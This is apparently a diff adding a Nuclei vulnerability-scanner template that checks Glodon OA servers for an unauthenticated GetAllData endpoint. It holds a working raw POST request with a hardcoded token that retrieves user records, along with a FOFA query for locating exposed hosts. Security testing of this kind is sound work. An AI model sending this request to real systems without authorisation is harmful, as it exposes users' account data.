@@ -1,0 +1,41 @@
+id: glodon-GetAllData-unauth
+info:
+  name: 广联达 OA GetAllData - unauth
+  author: leadlife
+  severity: high
+  description: 
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: body=“Services/Identification/login.ashx” || header=“Services/Identification/login.ashx” || banner=“Services/Identification/login.ashx”
+  tags: glodon,unauth
+  
+http:
+  - raw:
+      - |-
+        POST /WebService/Lk6SyncService/MrMMSSvc/DataSvc.asmx/GetAllData HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 32
+
+        Token=!@#$asdf$#@!&DataType=user
+    
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - USR_CODE
+      - type: word
+        part: body
+        words:
+          - NewDataSet
+      - type: word
+        part: header
+        words:
+          - '200'
+      - type: word
+        part: body
+        words:
+          - <?xml
+
